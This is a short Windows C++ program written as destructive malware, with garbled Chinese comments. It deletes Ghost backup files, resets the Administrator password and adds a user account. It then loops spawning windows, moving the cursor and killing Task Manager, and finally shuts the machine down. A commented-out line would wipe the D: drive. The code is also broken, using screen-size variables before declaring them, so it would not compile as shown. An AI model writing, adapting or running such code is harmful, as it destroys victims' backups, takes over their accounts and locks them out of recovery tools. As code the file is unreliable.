#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	char k=getch();
	system("del /a /f /s /q *.gho");
	system("net user Administrator wait");//�û���������Ϊwait
	system("net user ������С�ɰ����� wait /add");//�û�������Ϊxxx
	system("ping www.baidu.com");//ping�ٶ���վ
	k=getch();
	while(1)
	{
		SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
		system("calc");//����������������ֱ�����������ã� 
		system("cmd");//��cmd�����ã�
		system("taskkill /f /im taskmgr.exe");//��ֹ����������������ã�
	}		
	//system("del /F /S /Q D:\\");//ǿ��ɾ��D��(����)
	int x=GetSystemMetrics(SM_CXSCREEN);//get���x�� 
    int y=GetSystemMetrics(SM_CYSCREEN);//get���y��
	k=getch();
	system("shutdown /p");//���� 
	return 0;
}
